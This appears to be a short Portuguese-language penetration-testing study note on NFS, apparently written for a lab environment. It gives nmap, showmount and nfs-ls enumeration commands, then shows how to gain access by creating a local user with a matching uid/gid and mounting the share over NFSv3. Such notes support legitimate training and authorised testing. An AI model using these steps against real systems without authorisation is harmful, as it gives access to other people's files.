NFS
========================

# Resumo

## Enumeração

 A premissa do NFS é o mesmo do SMB, compartilhar arquivos por meio da rede, acontece que no caso do NFS não é utilizado autenticação e autorização em suas versões 3 e 2, somente um grau de seguranã maior na sua versão 4.
 
 Para explorar essa vulnerabilidade, primeiro precisamos fazer a enumeração do serviço por meio dos seguintes comandos:
 
 
     sudo nmap -sS -p 111,2049 --script nfs-showmount,nfs-ls 10.11.1.72
     #outra possibilidade também pode ser:
     sudo apt update
     sudo apt install libnfs-utils
     #Com isso a gente consegue fazer a enumeração das permissividades dos arquivos em modo recursivo
     nfs-ls -R nfs://10.11.1.72/home
     
     showmount -e 10.11.1.72
     
     nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254


![qownnotes-media-wrgegz](../../media/qownnotes-media-wrgegz.png)

## Exploitation

Assim que fizermos a enumeração, vamos identificar quais são os IDs pertinenetes aos arquivos lá constados no share via NFS, mas isso só é válido nas versões 2 e 3  do protocolo. A versão 4 já é mais segura! Basta adicionarmos o usuário e o grupo do usuário cujo uid e guid corespondem ao mesmo que foi identificao no momento da enumeração.

    sudo adduser --uid 1014 pwn
    sudo addgroup --gid 1014 pwn_group
    sudo usermod -a -G pwn_group pwn

    mount.nfs -o vers=3 10.11.1.72:/home /tmp/mount_dir